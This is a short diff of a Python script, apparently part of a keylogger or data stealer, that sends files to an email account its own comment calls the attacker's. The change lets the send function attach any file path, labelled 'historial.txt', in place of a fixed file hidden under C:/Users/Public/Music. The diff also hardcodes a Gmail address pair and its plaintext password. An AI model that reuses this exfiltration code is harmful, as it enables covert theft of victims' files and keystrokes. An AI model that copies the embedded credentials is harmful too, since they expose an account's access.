@@ -5,14 +5,14 @@ from email import encoders
 
 msg=MIMEMultipart()
 
-
-def send(subject):
+#Envio de email al correo del atacante
+def send(subject,path):
     password = "Joseluis123qwe"#password del correo donde se envia el archivo
     msg["From"]="josemowa@gmail.com"#direccion del correo donde se envia el archivo
     msg["To"]="josemowa45321@gmail.com"#correo destinatario
     msg["Subject"]=subject
     variable = MIMEBase('application', "octet-stream")
-    variable.set_payload(open("C:/Users/Public/Music/tmp.txt","rb").read())
+    variable.set_payload(open(path,"rb").read())
     encoders.encode_base64(variable)
     variable.add_header("Content-Disposition",'attachment;filename="historial.txt"')
     msg.attach(variable)
